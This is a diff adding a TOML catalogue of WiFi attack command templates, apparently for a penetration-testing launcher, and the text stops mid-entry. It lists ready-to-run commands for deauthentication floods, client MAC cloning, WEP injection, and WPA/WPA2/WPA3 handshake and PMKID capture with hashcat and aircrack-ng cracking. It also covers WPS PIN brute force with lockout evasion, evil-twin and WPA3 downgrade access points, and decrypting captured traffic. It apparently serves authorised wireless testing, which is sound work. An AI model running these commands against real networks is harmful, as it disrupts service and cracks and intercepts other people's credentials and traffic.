@@ -1,0 +1,1228 @@
+category = "wifi"
+display_name = "WiFi / 802.11"
+icon = "󰤨"
+order = 12
+
+# Placeholders (set via TUI edit or `chronosphere run … -v key=val`):
+#   iface=wlan0  mon_iface=wlan0mon  bssid=AA:BB:CC:DD:EE:FF  station=CLIENT_MAC
+#   channel=6  ssid=TargetNet  capture=captures/target  wordlist=/usr/share/wordlists/rockyou.txt
+#   hcap=handshake.hc22000  cap=handshake.cap  sae_hash=sae.22000
+#   eap=PEAP  phase2=mschapv2  cert_dir=/tmp/certs
+
+# === Host / interface enumeration ===
+
+[[command]]
+id = "wifi.iw.dev"
+title = "iw — list wireless devices"
+template = "iw dev"
+requires = ["iw"]
+tags = ["enum", "802.11", "iface"]
+
+[[command]]
+id = "wifi.iw.phy"
+title = "iw phy — PHY capabilities (bands, MIMO, monitor)"
+template = "iw phy"
+requires = ["iw"]
+tags = ["enum", "802.11"]
+
+[[command]]
+id = "wifi.iw.link"
+title = "iw dev {iface} link — current association"
+template = "iw dev {iface} link"
+requires = ["iw"]
+tags = ["enum", "802.11"]
+
+[[command]]
+id = "wifi.iw.scan.managed"
+title = "iw scan (managed mode, no monitor)"
+template = "iw dev {iface} scan | grep -E 'SSID|signal|freq|BSS'"
+requires = ["iw"]
+tags = ["enum", "scan"]
+
+[[command]]
+id = "wifi.ip.link"
+title = "ip link — interfaces up/down"
+template = "ip link show"
+requires = ["ip"]
+tags = ["enum", "network"]
+
+[[command]]
+id = "wifi.rfkill.list"
+title = "rfkill — soft/hard block status"
+template = "rfkill list"
+requires = ["rfkill"]
+tags = ["enum", "rfkill"]
+
+[[command]]
+id = "wifi.rfkill.unblock"
+title = "rfkill unblock all"
+template = "sudo rfkill unblock all"
+requires = ["rfkill"]
+tags = ["rfkill"]
+
+[[command]]
+id = "wifi.lspci.wireless"
+title = "lspci — wireless chipsets"
+template = "lspci | grep -iE 'network|wireless|wifi|wlan'"
+requires = ["lspci"]
+tags = ["enum", "hardware"]
+
+[[command]]
+id = "wifi.lsusb"
+title = "lsusb — USB WiFi adapters"
+template = "lsusb"
+requires = ["lsusb"]
+tags = ["enum", "hardware"]
+
+[[command]]
+id = "wifi.dmesg.wifi"
+title = "dmesg — driver/firmware messages"
+template = "dmesg | grep -iE 'iwl|ath|rtw|brcm|wlan|80211|firmware' | tail -50"
+tags = ["enum", "driver"]
+
+[[command]]
+id = "wifi.nmcli.scan"
+title = "nmcli — scan (NetworkManager)"
+template = "nmcli dev wifi list"
+requires = ["nmcli"]
+tags = ["enum", "scan", "nm"]
+
+# === MAC / identity ===
+
+[[command]]
+id = "wifi.mac.random"
+title = "macchanger — random MAC on {iface}"
+template = "sudo macchanger -r {iface}"
+requires = ["macchanger"]
+tags = ["mac", "opsec"]
+
+[[command]]
+id = "wifi.mac.show"
+title = "macchanger — show current MAC"
+template = "macchanger -s {iface}"
+requires = ["macchanger"]
+tags = ["mac"]
+
+[[command]]
+id = "wifi.mac.spoof"
+title = "macchanger — spoof to {station} (client clone)"
+template = "sudo macchanger -m {station} {iface}"
+requires = ["macchanger"]
+tags = ["mac", "opsec"]
+
+# === Monitor mode (airmon-ng / iw) ===
+
+[[command]]
+id = "wifi.airmon.list"
+title = "airmon-ng — list interfaces / driver"
+template = "sudo airmon-ng"
+requires = ["airmon-ng"]
+tags = ["monitor", "airmon"]
+
+[[command]]
+id = "wifi.airmon.check"
+title = "airmon-ng check — processes blocking injection"
+template = "sudo airmon-ng check"
+requires = ["airmon-ng"]
+tags = ["monitor", "airmon"]
+
+[[command]]
+id = "wifi.airmon.check_kill"
+title = "airmon-ng check kill — stop NetworkManager etc."
+template = "sudo airmon-ng check kill"
+requires = ["airmon-ng"]
+tags = ["monitor", "airmon"]
+
+[[command]]
+id = "wifi.airmon.start"
+title = "airmon-ng start {iface} — enable monitor"
+template = "sudo airmon-ng start {iface}"
+requires = ["airmon-ng"]
+tags = ["monitor", "airmon"]
+
+[[command]]
+id = "wifi.airmon.stop"
+title = "airmon-ng stop {mon_iface} — back to managed"
+template = "sudo airmon-ng stop {mon_iface}"
+requires = ["airmon-ng"]
+tags = ["monitor", "airmon"]
+
+[[command]]
+id = "wifi.iw.monitor"
+title = "iw — set monitor mode (no airmon-ng)"
+template = "sudo ip link set {iface} down && sudo iw dev {iface} set type monitor && sudo ip link set {iface} up"
+requires = ["iw"]
+tags = ["monitor"]
+
+[[command]]
+id = "wifi.iw.managed"
+title = "iw — restore managed mode"
+template = "sudo ip link set {iface} down && sudo iw dev {iface} set type managed && sudo ip link set {iface} up"
+requires = ["iw"]
+tags = ["monitor"]
+
+[[command]]
+id = "wifi.chain.monitor_scan"
+title = "chain: check kill → airmon start → airodump"
+template = """sudo airmon-ng check kill \\
+ && sudo airmon-ng start {iface} \\
+ && sudo airodump-ng {mon_iface}"""
+requires = ["airmon-ng", "airodump-ng"]
+tags = ["chain", "monitor", "scan"]
+
+# === Discovery / capture (airodump-ng) ===
+
+[[command]]
+id = "wifi.airodump.all"
+title = "airodump-ng — scan all APs/clients"
+template = "sudo airodump-ng {mon_iface}"
+requires = ["airodump-ng"]
+tags = ["scan", "airodump"]
+
+[[command]]
+id = "wifi.airodump.band_abg"
+title = "airodump-ng — 2.4 + 5 GHz (abg)"
+template = "sudo airodump-ng --band abg {mon_iface}"
+requires = ["airodump-ng"]
+tags = ["scan", "airodump", "5ghz"]
+
+[[command]]
+id = "wifi.airodump.targeted"
+title = "airodump-ng — channel + BSSID + write capture"
+template = "sudo airodump-ng -c {channel} --bssid {bssid} -w {capture} {mon_iface}"
+requires = ["airodump-ng"]
+tags = ["scan", "airodump", "capture"]
+
+[[command]]
+id = "wifi.airodump.essid"
+title = "airodump-ng — filter ESSID + write"
+template = "sudo airodump-ng --essid '{ssid}' -w {capture} {mon_iface}"
+requires = ["airodump-ng"]
+tags = ["scan", "airodump", "capture"]
+
+[[command]]
+id = "wifi.airodump.manuf"
+title = "airodump-ng — show manufacturer OUIs"
+template = "sudo airodump-ng --manufacturer {mon_iface}"
+requires = ["airodump-ng"]
+tags = ["scan", "airodump"]
+
+[[command]]
+id = "wifi.airodump.wps_only"
+title = "airodump-ng — WPS-enabled networks only"
+template = "sudo airodump-ng --wps {mon_iface}"
+requires = ["airodump-ng"]
+tags = ["scan", "wps"]
+
+[[command]]
+id = "wifi.airodump.write_interval"
+title = "airodump-ng — fast CSV refresh (1s)"
+template = "sudo airodump-ng --write-interval 1 -w {capture} {mon_iface}"
+requires = ["airodump-ng"]
+tags = ["scan", "airodump"]
+
+[[command]]
+id = "wifi.wash"
+title = "wash — WPS scan (2.4 GHz)"
+template = "sudo wash -i {mon_iface}"
+requires = ["wash"]
+tags = ["scan", "wps"]
+
+[[command]]
+id = "wifi.wash.5ghz"
+title = "wash — 5 GHz WPS scan"
+template = "sudo wash -i {mon_iface} -5"
+requires = ["wash"]
+tags = ["scan", "wps", "5ghz"]
+
+[[command]]
+id = "wifi.wash.channel"
+title = "wash — single channel"
+template = "sudo wash -i {mon_iface} -c {channel}"
+requires = ["wash"]
+tags = ["scan", "wps"]
+
+# === aireplay-ng (injection / attacks) ===
+
+[[command]]
+id = "wifi.aireplay.deauth"
+title = "aireplay-ng — deauth AP (broadcast, -0)"
+template = "sudo aireplay-ng -0 10 -a {bssid} {mon_iface}"
+requires = ["aireplay-ng"]
+tags = ["deauth", "aireplay", "wpa"]
+
+[[command]]
+id = "wifi.aireplay.deauth.client"
+title = "aireplay-ng — deauth client (-0, directed)"
+template = "sudo aireplay-ng -0 10 -a {bssid} -c {station} {mon_iface}"
+requires = ["aireplay-ng"]
+tags = ["deauth", "aireplay", "wpa"]
+
+[[command]]
+id = "wifi.aireplay.deauth.continuous"
+title = "aireplay-ng — continuous deauth (handshake harvest)"
+template = "sudo aireplay-ng -0 0 -a {bssid} {mon_iface}"
+requires = ["aireplay-ng"]
+tags = ["deauth", "aireplay", "wpa"]
+
+[[command]]
+id = "wifi.aireplay.fakeauth"
+title = "aireplay-ng — fake authentication (-1, WEP/open)"
+template = "sudo aireplay-ng -1 0 -e '{ssid}' -a {bssid} {mon_iface}"
+requires = ["aireplay-ng"]
+tags = ["aireplay", "wep"]
+
+[[command]]
+id = "wifi.aireplay.arp"
+title = "aireplay-ng — ARP replay (-3, WEP)"
+template = "sudo aireplay-ng -3 -b {bssid} -h {station} {mon_iface}"
+requires = ["aireplay-ng"]
+tags = ["aireplay", "wep"]
+
+[[command]]
+id = "wifi.aireplay.chopchop"
+title = "aireplay-ng — chopchop (-4, WEP)"
+template = "sudo aireplay-ng -4 -h {station} {mon_iface}"
+requires = ["aireplay-ng"]
+tags = ["aireplay", "wep"]
+
+[[command]]
+id = "wifi.aireplay.fragmentation"
+title = "aireplay-ng — fragmentation (-5, WEP)"
+template = "sudo aireplay-ng -5 -b {bssid} {mon_iface}"
+requires = ["aireplay-ng"]
+tags = ["aireplay", "wep"]
+
+[[command]]
+id = "wifi.aireplay.caffe_latte"
+title = "aireplay-ng — caffe-latte (-6, WEP client)"
+template = "sudo aireplay-ng -6 {mon_iface}"
+requires = ["aireplay-ng"]
+tags = ["aireplay", "wep"]
+
+[[command]]
+id = "wifi.aireplay.cfrag"
+title = "aireplay-ng — cfrag (-7)"
+template = "sudo aireplay-ng -7 {mon_iface}"
+requires = ["aireplay-ng"]
+tags = ["aireplay"]
+
+[[command]]
+id = "wifi.aireplay.misassoc"
+title = "aireplay-ng — misassociation (-8)"
+template = "sudo aireplay-ng -8 {mon_iface}"
+requires = ["aireplay-ng"]
+tags = ["aireplay"]
+
+[[command]]
+id = "wifi.aireplay.test"
+title = "aireplay-ng — test injection (-9)"
+template = "sudo aireplay-ng -9 {mon_iface}"
+requires = ["aireplay-ng"]
+tags = ["aireplay", "injection"]
+
+[[command]]
+id = "wifi.chain.handshake"
+title = "chain: targeted airodump + deauth burst"
+template = """sudo airodump-ng -c {channel} --bssid {bssid} -w {capture} {mon_iface} &
+sleep 3
+sudo aireplay-ng -0 15 -a {bssid} {mon_iface}"""
+requires = ["airodump-ng", "aireplay-ng"]
+tags = ["chain", "wpa", "handshake"]
+
+# === packetforge-ng / WEP tooling ===
+
+[[command]]
+id = "wifi.packetforge.arp"
+title = "packetforge-ng — forge ARP (WEP)"
+template = "sudo packetforge-ng -a {bssid} -h {station} -k 255.255.255.255 -l 255.255.255.255 -y xor -w forged {mon_iface}"
+requires = ["packetforge-ng"]
+tags = ["wep", "packetforge"]
+
+[[command]]
+id = "wifi.aircrack.wep"
+title = "aircrack-ng — crack WEP (.cap)"
+template = "aircrack-ng {cap}"
+requires = ["aircrack-ng"]
+tags = ["crack", "wep", "aircrack"]
+
+[[command]]
+id = "wifi.aircrack.wep.bssid"
+title = "aircrack-ng — WEP with BSSID filter"
+template = "aircrack-ng -b {bssid} {cap}"
+requires = ["aircrack-ng"]
+tags = ["crack", "wep", "aircrack"]
+
+[[command]]
+id = "wifi.besside"
+title = "besside-ng — auto WEP/WPA capture + crack attempt"
+template = "sudo besside-ng -b {bssid} {mon_iface}"
+requires = ["besside-ng"]
+tags = ["wep", "wpa", "auto"]
+
+# === WPA / WPA2 personal — capture & crack ===
+
+[[command]]
+id = "wifi.aircrack.wpa"
+title = "aircrack-ng — WPA-PSK (-a 2, wordlist)"
+template = "aircrack-ng -a 2 -w {wordlist} -b {bssid} {cap}"
+requires = ["aircrack-ng"]
+tags = ["crack", "wpa", "aircrack"]
+
+[[command]]
+id = "wifi.aircrack.wpa.essid"
+title = "aircrack-ng — WPA with ESSID hint"
+template = "aircrack-ng -a 2 -e '{ssid}' -w {wordlist} -b {bssid} {cap}"
+requires = ["aircrack-ng"]
+tags = ["crack", "wpa", "aircrack"]
+
+[[command]]
+id = "wifi.aircrack.wpa2"
+title = "aircrack-ng — WPA2-PSK (same as WPA)"
+template = "aircrack-ng -a 2 -w {wordlist} -b {bssid} {cap}"
+requires = ["aircrack-ng"]
+tags = ["crack", "wpa2", "aircrack"]
+
+[[command]]
+id = "wifi.hcxdump"
+title = "hcxdumptool — PMKID + EAPOL capture"
+template = "sudo hcxdumptool -i {mon_iface} -o {capture}.pcapng --enable_status=1"
+requires = ["hcxdumptool"]
+tags = ["pmkid", "hcx", "capture"]
+
+[[command]]
+id = "wifi.hcxdump.filter"
+title = "hcxdumptool — filter BSSID"
+template = "sudo hcxdumptool -i {mon_iface} -o {capture}.pcapng --filterlist_ap={bssid} --filterlist_client= --enable_status=1"
+requires = ["hcxdumptool"]
+tags = ["pmkid", "hcx", "capture"]
+
+[[command]]
+id = "wifi.hcxpcapng"
+title = "hcxpcapngtool — cap/pcapng → hc22000 hash"
+template = "hcxpcapngtool -o {hcap} {cap}"
+requires = ["hcxpcapngtool"]
+tags = ["pmkid", "hcx", "convert"]
+
+[[command]]
+id = "wifi.hashcat.hc22000"
+title = "hashcat — mode 22000 (WPA-PBKDF2-PMKID+EAPOL)"
+template = "hashcat -m 22000 {hcap} {wordlist} --status"
+requires = ["hashcat"]
+tags = ["crack", "wpa", "hashcat"]
+
+[[command]]
+id = "wifi.hashcat.hccapx"
+title = "hashcat — mode 2500 (legacy .hccapx)"
+template = "hashcat -m 2500 handshake.hccapx {wordlist} --status"
+requires = ["hashcat"]
+tags = ["crack", "wpa", "hashcat"]
+
+[[command]]
+id = "wifi.john.wpapsk"
+title = "john — wpapsk format (.cap converted)"
+template = "john --wordlist={wordlist} --format=wpapsk handshake.john"
+requires = ["john"]
+tags = ["crack", "wpa", "john"]
+
+[[command]]
+id = "wifi.chain.hcx_crack"
+title = "chain: hcxdump → hcxpcapngtool → hashcat 22000"
+template = """sudo hcxdumptool -i {mon_iface} -o {capture}.pcapng --enable_status=1 \\
+ && hcxpcapngtool -o {hcap} {capture}.pcapng \\
+ && hashcat -m 22000 {hcap} {wordlist} --status"""
+requires = ["hcxdumptool", "hcxpcapngtool", "hashcat"]
+tags = ["chain", "pmkid", "crack"]
+
+# === WPA2-PSK — capture, PMF, and crack ===
+
+[[command]]
+id = "wifi.iw.scan.rsn"
+title = "iw scan — RSN/PMF/WPA version (managed)"
+template = "iw dev {iface} scan dump | grep -E 'SSID|RSN|WPA|Capabilities|Authentication suites|Group cipher|signal'"
+requires = ["iw"]
+tags = ["enum", "wpa2", "pmf", "rsn"]
+
+[[command]]
+id = "wifi.tshark.rsn"
+title = "tshark — parse RSN IE (PMF, cipher suites)"
+template = "tshark -r {cap} -Y 'wlan.rsn.version' -T fields -e wlan.sa -e wlan.tag -e wlan.rsn.capabilities -e wlan.rsn.akms"
+requires = ["tshark"]
+tags = ["analyze", "wpa2", "pmf", "rsn"]
+
+[[command]]
+id = "wifi.tshark.handshake.check"
+title = "tshark — verify 4-way handshake present"
+template = "tshark -r {cap} -Y 'eapol.keydes.key_info' -T fields -e frame.number -e wlan.sa -e wlan.da -e eapol.keydes.key_info"
+requires = ["tshark"]
+tags = ["analyze", "wpa2", "handshake"]
+
+[[command]]
+id = "wifi.airodump.wpa2.targeted"
+title = "airodump-ng — WPA2 capture (channel + BSSID lock)"
+template = "sudo airodump-ng -c {channel} --bssid {bssid} --write-interval 1 -w {capture} {mon_iface}"
+requires = ["airodump-ng"]
+tags = ["capture", "wpa2", "airodump"]
+
+[[command]]
+id = "wifi.aireplay.deauth.wpa2.client"
+title = "aireplay-ng — client deauth (PMF-safe path)"
+template = "sudo aireplay-ng -0 20 -a {bssid} -c {station} {mon_iface}"
+requires = ["aireplay-ng"]
+tags = ["deauth", "wpa2", "pmf", "handshake"]
+
+[[command]]
+id = "wifi.chain.wpa2.handshake.client"
+title = "chain: WPA2 capture + client-only deauth (PMF APs)"
+template = """sudo airodump-ng -c {channel} --bssid {bssid} -w {capture} {mon_iface} &
+sleep 3
+sudo aireplay-ng -0 25 -a {bssid} -c {station} {mon_iface}"""
+requires = ["airodump-ng", "aireplay-ng"]
+tags = ["chain", "wpa2", "handshake", "pmf"]
+
+[[command]]
+id = "wifi.mdk4.deauth.client"
+title = "mdk4 — directed deauth to client (WPA2)"
+template = "sudo mdk4 {mon_iface} d -B {bssid} -S {station}"
+requires = ["mdk4"]
+tags = ["deauth", "wpa2", "pmf", "mdk4"]
+
+[[command]]
+id = "wifi.hcxdump.passive"
+title = "hcxdumptool — passive PMKID (no client attacks)"
+template = "sudo hcxdumptool -i {mon_iface} -o {capture}.pcapng --enable_status=1 --disable_client_attacks=1"
+requires = ["hcxdumptool"]
+tags = ["pmkid", "wpa2", "hcx", "passive"]
+
+[[command]]
+id = "wifi.hcxdump.active"
+title = "hcxdumptool — active assoc for EAPOL (WPA2 handshake)"
+template = "sudo hcxdumptool -i {mon_iface} -o {capture}.pcapng --filterlist_ap={bssid} --enable_status=1 --active_beacon --association_timing=1"
+requires = ["hcxdumptool"]
+tags = ["capture", "wpa2", "hcx", "eapol", "handshake"]
+
+[[command]]
+id = "wifi.hcxdump.wpa2.targeted"
+title = "hcxdumptool — WPA2 BSSID filter (PMKID + EAPOL)"
+template = "sudo hcxdumptool -i {mon_iface} -o {capture}.pcapng --filterlist_ap={bssid} --filterlist_client= --enable_status=1 --rds=1"
+requires = ["hcxdumptool"]
+tags = ["capture", "wpa2", "pmkid", "hcx"]
+
+[[command]]
+id = "wifi.hcxpcapng.eapol"
+title = "hcxpcapngtool + hcxhashtool — keep EAPOL (WPA*02) only"
+template = "hcxpcapngtool -o {hcap} {cap} && hcxhashtool -i {hcap} --type=2 -o eapol.{hcap}"
+requires = ["hcxpcapngtool", "hcxhashtool"]
+tags = ["convert", "wpa2", "eapol", "hcx", "filter"]
+
+[[command]]
+id = "wifi.hcxpcapng.pmkid"
+title = "hcxpcapngtool + hcxhashtool — keep PMKID (WPA*01) only"
+template = "hcxpcapngtool -o {hcap} {cap} && hcxhashtool -i {hcap} --type=1 -o pmkid.{hcap}"
+requires = ["hcxpcapngtool", "hcxhashtool"]
+tags = ["convert", "wpa2", "pmkid", "hcx", "filter"]
+
+[[command]]
+id = "wifi.hcxhashtool.info"
+title = "hcxhashtool — inspect hc22000 hash metadata"
+template = "hcxhashtool -i {hcap} --info"
+requires = ["hcxhashtool"]
+tags = ["analyze", "wpa2", "hcx"]
+
+[[command]]
+id = "wifi.aircrack.wpa2.korek"
+title = "aircrack-ng — WPA2 with KoreK (-K)"
+template = "aircrack-ng -a 2 -K -w {wordlist} -b {bssid} {cap}"
+requires = ["aircrack-ng"]
+tags = ["crack", "wpa2", "aircrack"]
+
+[[command]]
+id = "wifi.aircrack.wpa2.ptw"
+title = "aircrack-ng — WPA2 with PTW (-P)"
+template = "aircrack-ng -a 2 -P 1024 -w {wordlist} -b {bssid} {cap}"
+requires = ["aircrack-ng"]
+tags = ["crack", "wpa2", "aircrack"]
+
+[[command]]
+id = "wifi.cowpatty"
+title = "cowpatty — WPA2-PSK crack (genpmk + cowpatty)"
+template = "genpmk -f {wordlist} -d pmk.db -s '{ssid}' && cowpatty -r {cap} -s '{ssid}' -d pmk.db"
+requires = ["cowpatty"]
+tags = ["crack", "wpa2", "cowpatty"]
+
+[[command]]
+id = "wifi.hashcat.hc22000.rules"
+title = "hashcat — WPA2 mode 22000 + rules"
+template = "hashcat -m 22000 {hcap} {wordlist} -r /usr/share/hashcat/rules/best64.rule --status"
+requires = ["hashcat"]
+tags = ["crack", "wpa2", "hashcat", "rules"]
+
+[[command]]
+id = "wifi.hashcat.hc22000.show"
+title = "hashcat — show cracked WPA2 hash"
+template = "hashcat -m 22000 {hcap} --show"
+requires = ["hashcat"]
+tags = ["crack", "wpa2", "hashcat"]
+
+[[command]]
+id = "wifi.chain.wpa2.pmkid"
+title = "chain: passive PMKID → convert → hashcat (WPA2)"
+template = """sudo hcxdumptool -i {mon_iface} -o {capture}.pcapng --filterlist_ap={bssid} --enable_status=1 --disable_client_attacks=1 \\
+ && hcxpcapngtool -o {hcap} {capture}.pcapng \\
+ && hashcat -m 22000 {hcap} {wordlist} --status"""
+requires = ["hcxdumptool", "hcxpcapngtool", "hashcat"]
+tags = ["chain", "wpa2", "pmkid", "crack"]
+
+[[command]]
+id = "wifi.hostapd.evil_twin.wpa2"
+title = "hostapd — WPA2-PSK evil twin (edit /tmp/hostapd-wpa2.conf)"
+template = """cat > /tmp/hostapd-wpa2.conf <<'EOF'
+interface={iface}
+driver=nl80211
+ssid={ssid}
+hw_mode=g
+channel={channel}
+wpa=2
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=CCMP
+rsn_pairwise=CCMP
+wpa_passphrase=WrongPassword123
+EOF
+sudo hostapd /tmp/hostapd-wpa2.conf"""
+requires = ["hostapd"]
+tags = ["evil-twin", "wpa2", "rogue"]
+
+# === WPA3 personal / transition mode ===
+
+[[command]]
+id = "wifi.iw.scan.wpa3"
+title = "iw scan — detect WPA3-SAE / transition BSS"
+template = "iw dev {iface} scan dump | grep -E 'SSID|RSN|SAE|AKM|Capabilities|signal' | grep -B5 -i sae"
+requires = ["iw"]
+tags = ["enum", "wpa3", "sae", "transition"]
+
+[[command]]
+id = "wifi.nmcli.wpa3"
+title = "nmcli — list networks with security type"
+template = "nmcli -f IN-USE,SSID,BSSID,CHAN,SECURITY,SIGNAL dev wifi list"
+requires = ["nmcli"]
+tags = ["enum", "wpa3", "scan"]
+
+[[command]]
+id = "wifi.airodump.wpa3"
+title = "airodump-ng — scan (check ENC column for WPA3/SAE)"
+template = "sudo airodump-ng --band abg --write-interval 1 {mon_iface}"
+requires = ["airodump-ng"]
+tags = ["scan", "wpa3", "sae", "transition"]
+
+[[command]]
+id = "wifi.hcxdump.wpa3"
+title = "hcxdumptool — WPA3 / transition capture (SAE + PMKID)"
+template = "sudo hcxdumptool -i {mon_iface} -o {capture}.pcapng --filterlist_ap={bssid} --enable_status=1 --rds=1 --exitoneapol=1"
+requires = ["hcxdumptool"]
+tags = ["capture", "wpa3", "sae", "hcx"]
+
+[[command]]
+id = "wifi.hcxdump.wpa3.passive"
+title = "hcxdumptool — passive WPA3 transition PMKID"
+template = "sudo hcxdumptool -i {mon_iface} -o {capture}.pcapng --filterlist_ap={bssid} --enable_status=1 --disable_client_attacks=1 --rds=1"
+requires = ["hcxdumptool"]
+tags = ["capture", "wpa3", "pmkid", "transition", "hcx"]
+
+[[command]]
+id = "wifi.hcxpcapng.sae"
+title = "hcxpcapngtool — convert WPA3/SAE capture to hc22000"
+template = "hcxpcapngtool -o {sae_hash} --all {cap}"
+requires = ["hcxpcapngtool"]
+tags = ["convert", "wpa3", "sae", "hcx"]
+
+[[command]]
+id = "wifi.hcxpcapng.wpa3.all"
+title = "hcxpcapngtool — all WPA3 hash types from capture"
+template = "hcxpcapngtool -o {hcap} --all {cap}"
+requires = ["hcxpcapngtool"]
+tags = ["convert", "wpa3", "hcx"]
+
+[[command]]
+id = "wifi.hashcat.sae"
+title = "hashcat — mode 22000 (WPA3-SAE/PMKID/EAPOL)"
+template = "hashcat -m 22000 {sae_hash} {wordlist} --status"
+requires = ["hashcat"]
+tags = ["crack", "wpa3", "sae", "hashcat"]
+
+[[command]]
+id = "wifi.hashcat.sae.show"
+title = "hashcat — show cracked WPA3-SAE hash"
+template = "hashcat -m 22000 {sae_hash} --show"
+requires = ["hashcat"]
+tags = ["crack", "wpa3", "hashcat"]
+
+[[command]]
+id = "wifi.chain.wpa3.sae"
+title = "chain: WPA3 capture → hc22000 conversion → hashcat 22000"
+template = """sudo hcxdumptool -i {mon_iface} -o {capture}.pcapng --filterlist_ap={bssid} --enable_status=1 --rds=1 \\
+ && hcxpcapngtool -o {sae_hash} --all {capture}.pcapng \\
+ && hashcat -m 22000 {sae_hash} {wordlist} --status"""
+requires = ["hcxdumptool", "hcxpcapngtool", "hashcat"]
+tags = ["chain", "wpa3", "sae", "crack"]
+
+[[command]]
+id = "wifi.chain.wpa3.transition"
+title = "chain: transition mode — PMKID on WPA2 leg + crack 22000"
+template = """sudo hcxdumptool -i {mon_iface} -o {capture}.pcapng --filterlist_ap={bssid} --enable_status=1 --disable_client_attacks=1 \\
+ && hcxpcapngtool -o {hcap} {capture}.pcapng \\
+ && hashcat -m 22000 {hcap} {wordlist} --status"""
+requires = ["hcxdumptool", "hcxpcapngtool", "hashcat"]
+tags = ["chain", "wpa3", "transition", "wpa2", "pmkid"]
+
+[[command]]
+id = "wifi.transition.evil_twin.wpa2"
+title = "hostapd — transition downgrade evil twin (WPA2-only, same SSID)"
+template = """cat > /tmp/hostapd-transition.conf <<'EOF'
+interface={iface}
+driver=nl80211
+ssid={ssid}
+hw_mode=g
+channel={channel}
+wpa=2
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=CCMP
+rsn_pairwise=CCMP
+ieee80211w=0
+wpa_passphrase=WrongPassword123
+EOF
+sudo hostapd /tmp/hostapd-transition.conf"""
+requires = ["hostapd"]
+tags = ["evil-twin", "wpa3", "transition", "downgrade"]
+
+[[command]]
+id = "wifi.wifite.wpa3"
+title = "wifite — include WPA3 / transition targets"
+template = "sudo wifite --wpa --pmkid --no-wps"
+requires = ["wifite"]
+tags = ["auto", "wifite", "wpa3", "transition"]
+
+[[command]]
+id = "wifi.wpa_supplicant.wpa3"
+title = "wpa_supplicant — connect WPA3-SAE (after crack)"
+template = """cat > /tmp/wpa3.conf <<EOF
+network={{
+    ssid="{ssid}"
+    key_mgmt=SAE
+    psk="{password}"
+    ieee80211w=2
+}}
+EOF
+sudo wpa_supplicant -B -i {iface} -c /tmp/wpa3.conf && sleep 3 && sudo dhclient {iface}"""
+tags = ["postex", "wpa3", "connect"]
+
+[[command]]
+id = "wifi.tshark.sae"
+title = "tshark — list SAE authentication frames"
+template = "tshark -r {cap} -Y 'wlan.fixed.auth.algorithm == 3' -T fields -e frame.number -e wlan.sa -e wlan.da -e wlan.fixed.auth.algorithm"
+requires = ["tshark"]
+tags = ["analyze", "wpa3", "sae"]
+
+# === WPS ===
+
+[[command]]
+id = "wifi.reaver"
+title = "reaver — WPS PIN brute"
+template = "sudo reaver -i {mon_iface} -b {bssid} -vv"
+requires = ["reaver"]
+tags = ["wps", "reaver"]
+
+[[command]]
+id = "wifi.reaver.pixie"
+title = "reaver — Pixie-Dust (-K)"
+template = "sudo reaver -i {mon_iface} -b {bssid} -K 1 -vv"
+requires = ["reaver"]
+tags = ["wps", "pixie", "reaver"]
+
+[[command]]
+id = "wifi.reaver.lockout"
+title = "reaver — ignore lockouts / NACK"
+template = "sudo reaver -i {mon_iface} -b {bssid} -d 2 -T 1 -r 3:15 -vv"
+requires = ["reaver"]
+tags = ["wps", "reaver"]
+
+[[command]]
+id = "wifi.pixiewps"
+title = "pixiewps — offline Pixie (after M1-M7 dump)"
+template = "pixiewps -e <pke> -r <pkr> -s <e-hash1> -z <e-hash2> -a <authkey> -n <e-nonce>"
+requires = ["pixiewps"]
+tags = ["wps", "pixie"]
+
+[[command]]
+id = "wifi.bully"
+title = "bully — WPS PIN attack"
+template = "sudo bully {mon_iface} -b {bssid} -S -F -B -v 3"
+requires = ["bully"]
+tags = ["wps", "bully"]
+
+# === airolib-ng (precomputed PMK) ===
+
+[[command]]
+id = "wifi.airolib.create"
+title = "airolib-ng — create database"
+template = "airolib-ng wifi.db --import essid --import-password {wordlist}"
+requires = ["airolib-ng"]
+tags = ["airolib", "pmk"]
+
+[[command]]
+id = "wifi.airolib.generate"
+title = "airolib-ng — generate PMKs"
+template = "airolib-ng wifi.db --clean all && airolib-ng wifi.db --stats && airolib-ng wifi.db --batch"
+requires = ["airolib-ng"]
+tags = ["airolib", "pmk"]
+
+[[command]]
+id = "wifi.airolib.stats"
+title = "airolib-ng — database stats"
+template = "airolib-ng wifi.db --stats"
+requires = ["airolib-ng"]
+tags = ["airolib"]
+
+[[command]]
+id = "wifi.aircrack.airolib"
+title = "aircrack-ng — crack with airolib-ng DB"
+template = "aircrack-ng -r wifi.db {cap}"
+requires = ["aircrack-ng", "airolib-ng"]
+tags = ["crack", "wpa", "airolib"]
+
+# === Decrypt / analyze captures ===
+
+[[command]]
+id = "wifi.airdecap"
+title = "airdecap-ng — decrypt capture with PSK"
+template = "airdecap-ng -e '{ssid}' -p '{password}' {cap}"
+requires = ["airdecap-ng"]
+tags = ["decrypt", "airdecap"]
+
+[[command]]
+id = "wifi.airdecap.bssid"
+title = "airdecap-ng — decrypt with BSSID + PSK"
+template = "airdecap-ng -b {bssid} -p '{password}' {cap}"
+requires = ["airdecap-ng"]
+tags = ["decrypt", "airdecap"]
+
+[[command]]
+id = "wifi.airdecloak"
+title = "airdecloak-ng — remove WEP cloaking"
+template = "airdecloak-ng {cap}"
+requires = ["airdecloak-ng"]
+tags = ["wep", "airdecloak"]
+
+[[command]]
+id = "wifi.tshark.eapol"
+title = "tshark — list EAPOL frames in capture"
+template = "tshark -r {cap} -Y 'eapol' -T fields -e wlan.sa -e wlan.da -e eapol.type"
+requires = ["tshark"]
+tags = ["analyze", "handshake"]
+
+[[command]]
+id = "wifi.cap2hccapx"
+title = "cap2hccapx — legacy hashcat conversion"
+template = "cap2hccapx {cap} handshake.hccapx"
+requires = ["cap2hccapx"]
+tags = ["convert", "hashcat"]
+
+# === Rogue AP / MITM (airbase-ng, tunneling) ===
+
+[[command]]
+id = "wifi.airbase.softap"
+title = "airbase-ng — soft AP (open/WEP)"
+template = "sudo airbase-ng -e '{ssid}' -c {channel} {mon_iface}"
+requires = ["airbase-ng"]
+tags = ["rogue", "evil-twin", "airbase"]
+
+[[command]]
+id = "wifi.airbase.wpa"
+title = "airbase-ng — WPA PSK rogue (-W 1)"
+template = "sudo airbase-ng -e '{ssid}' -c {channel} -W 1 -N -P {mon_iface}"
+requires = ["airbase-ng"]
+tags = ["rogue", "evil-twin", "airbase"]
+
+[[command]]
+id = "wifi.airtun"
+title = "airtun-ng — decrypt/tunnel to at0"
